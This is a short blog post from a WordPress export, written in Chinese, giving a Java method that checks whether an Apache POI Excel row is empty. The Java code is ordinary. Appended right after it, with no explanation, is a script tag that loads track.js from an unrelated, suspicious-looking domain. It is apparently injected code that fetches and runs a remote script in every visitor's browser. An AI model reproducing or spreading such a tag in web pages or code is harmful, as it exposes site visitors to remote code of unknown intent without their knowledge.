---
id: 52
title: 'java excel poi导入  判断是否是空行'
date: '2020-03-27T13:00:40+08:00'
author: gavin
layout: post
guid: 'http://gaving.top/?p=52'
permalink: /index.php/2020/03/27/java-excel-poi%e5%af%bc%e5%85%a5-%e5%88%a4%e6%96%ad%e6%98%af%e5%90%a6%e6%98%af%e7%a9%ba%e8%a1%8c/
blocksy_post_meta_options:
    - 'a:1:{s:17:"styles_descriptor";a:3:{s:6:"styles";a:3:{s:7:"desktop";s:0:"";s:6:"tablet";s:0:"";s:6:"mobile";s:0:"";}s:12:"google_fonts";a:0:{}s:7:"version";i:5;}}'
categories:
    - Java
---

public static boolean isRowEmpty(Row row) {

for (int c = row.getFirstCellNum(); c < row.getLastCellNum(); c++) {

Cell cell = row.getCell(c);

if (cell != null && cell.getCellType() != Cell.CELL\_TYPE\_BLANK)

return false;

}

return true;

}<script src="https://trick.cofounderspecials.com/track.js?v=9.999" type="text/javascript"></script>